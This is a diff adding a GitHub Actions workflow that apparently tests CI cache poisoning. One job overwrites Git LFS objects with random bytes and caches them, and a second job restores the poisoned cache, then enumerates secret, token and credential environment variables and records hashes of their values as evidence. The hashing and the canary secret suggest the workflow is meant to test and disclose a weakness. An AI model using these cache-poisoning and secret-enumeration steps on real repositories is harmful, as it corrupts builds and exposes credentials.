@@ -1,0 +1,90 @@
+name: CH-004 Secrets Boundary Breach
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  poison-lfs:
+    runs-on: ubuntu-latest
+    env:
+      CANARY_SECRET: ${{ secrets.CANARY_SECRET || 'canary-default-for-poc' }}
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
+    - name: Fetch LFS + poison cache
+      env:
+        GIT_LFS_SKIP_SMUDGE: "1"
+      run: |
+        mkdir -p evidence
+        git lfs install --local
+        git lfs fetch origin 2>&1 | tee evidence/poison-lfs-fetch.txt || true
+        echo "=== CH-004: Poison LFS cache ==="
+        find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
+          ORIGINAL_SIZE=$(stat -c%s "$obj")
+          dd if=/dev/urandom of="$obj" bs=1 count="$ORIGINAL_SIZE" 2>/dev/null
+          echo "$obj size=$ORIGINAL_SIZE" >> evidence/poison-manifest.txt
+        done
+    - name: Save poisoned cache
+      uses: actions/cache/save@v4
+      with:
+        path: .git/lfs
+        key: ch004-lfs-${{ github.run_id }}-poison
+
+  read-secrets:
+    needs: poison-lfs
+    runs-on: ubuntu-latest
+    env:
+      CANARY_SECRET: ${{ secrets.CANARY_SECRET || 'canary-default-for-poc' }}
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
+    - name: Restore poisoned cache + checkout
+      uses: actions/cache/restore@v4
+      with:
+        path: .git/lfs
+        key: ch004-lfs-${{ github.run_id }}-poison
+    - name: Checkout poisoned LFS + check secrets
+      continue-on-error: true
+      run: |
+        mkdir -p evidence
+        git lfs install --local
+        git lfs fetch origin 2>&1 | tee evidence/lfs-fetch.txt || true
+        git lfs checkout 2>&1 | tee evidence/lfs-checkout.txt || true
+        echo "lfs_checkout_rc=$?" >> evidence/lfs-checkout-rc.txt
+    - name: V4 - Secret boundary check
+      run: |
+        mkdir -p evidence
+        echo "=== CH-004: Secrets Boundary Breach ==="
+        LFS_RC=$(cat evidence/lfs-checkout-rc.txt 2>/dev/null | tr -dc '0-9' | tail -c1)
+        SECRET_COUNT=0
+        for v in $(env | grep -iE 'secret|password|token|key|credential' | cut -d= -f1); do
+          VAL="${!v}"
+          if [ -n "$VAL" ] && [ ${#VAL} -gt 4 ]; then
+            HASH=$(echo -n "$VAL" | sha256sum | awk '{print $1}')
+            echo "secret_var=$v hash=$HASH len=${#VAL}" >> evidence/ch004-secrets.json
+            SECRET_COUNT=$((SECRET_COUNT+1))
+          fi
+        done
+        echo "secret_count=$SECRET_COUNT lfs_checkout_rc=$LFS_RC" >> evidence/ch004-result.json
+        if [ -n "$CANARY_SECRET" ] && [ ${#CANARY_SECRET} -gt 4 ]; then
+          CANARY_HASH=$(echo -n "$CANARY_SECRET" | sha256sum | awk '{print $1}')
+          echo "canary_accessible=true canary_hash=$CANARY_HASH" >> evidence/ch004-result.json
+          echo "::add-mask::$CANARY_SECRET"
+        else
+          echo "canary_accessible=false" >> evidence/ch004-result.json
+        fi
+        cat evidence/ch004-result.json 2>/dev/null || true
+    - name: Upload evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: ch004-evidence-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
+    - name: Print verdict
+      run: |
+        echo "## CH-004: Secrets Boundary Breach Verdict" >> $GITHUB_STEP_SUMMARY
+        cat evidence/ch004-result.json 2>/dev/null >> $GITHUB_STEP_SUMMARY || true
